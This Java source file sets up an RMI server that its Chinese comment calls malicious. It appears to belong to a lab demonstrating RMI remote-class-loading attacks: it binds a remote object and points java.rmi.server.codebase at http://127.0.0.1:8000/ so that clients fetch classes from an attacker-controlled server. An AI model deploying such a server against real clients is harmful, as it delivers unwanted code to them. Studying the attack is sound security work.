package me.mole.javarmi;

import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * 恶意的RMI服务器
 */
public class RMIServer1 {
    public static void main(String[] args) {
        try {
            // 实例化服务端远程对象
            ServicesImpl1 obj = new ServicesImpl1();

            //设置java.rmi.server.codebase
            System.setProperty("java.rmi.server.codebase", "http://127.0.0.1:8000/");

            Registry registry = null;
            try {
                // 创建Registry
                registry = LocateRegistry.createRegistry(9999);
                System.out.println("java RMI registry created. port on 9999...");
            } catch (Exception e) {
                System.out.println("Using existing registry");
                registry = LocateRegistry.getRegistry();
            }
            //绑定远程对象到Registry
            registry.bind("Services", obj);
        } catch (RemoteException e) {
            e.printStackTrace();
        } catch (AlreadyBoundException e) {
            e.printStackTrace();
        }
    }
}
